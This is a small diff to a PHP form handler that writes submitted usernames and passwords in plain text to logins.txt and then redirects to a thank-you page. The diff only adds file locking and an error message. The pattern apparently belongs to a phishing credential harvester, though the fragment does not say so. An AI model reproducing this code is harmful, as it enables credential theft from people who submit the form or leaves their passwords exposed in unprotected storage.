@@ -6,7 +6,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $data = "Username: $username | Password: $password\n";
 
     // Save to a text file
-    file_put_contents("logins.txt", $data, FILE_APPEND);
+    file_put_contents("logins.txt", $data, FILE_APPEND | LOCK_EX) or die("❌ Could not write to logins.txt");
+
 
     // Redirect to thank you page
     header("Location: thankyou.html");
